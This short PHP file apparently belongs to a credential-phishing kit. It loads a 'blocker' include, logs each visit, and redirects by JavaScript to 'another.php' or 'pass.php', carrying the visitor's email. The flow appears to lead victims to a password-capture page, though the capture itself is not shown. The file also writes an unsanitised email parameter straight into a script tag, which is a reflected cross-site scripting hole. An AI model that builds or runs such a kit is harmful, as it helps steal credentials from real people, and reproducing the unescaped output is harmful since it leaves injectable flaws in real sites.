<?php
session_start();
require 'core/functions.php';
require 'core/blocker.php';

logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");

if(empty($_SESSION['email'])) {
    echo "<script>window.location = 'another.php?email={$_GET['email']}';</script>";
    exit();
} else {
    echo "<script>window.location = 'pass.php?email={$_SESSION['email']}';</script>";
    exit();
}
?>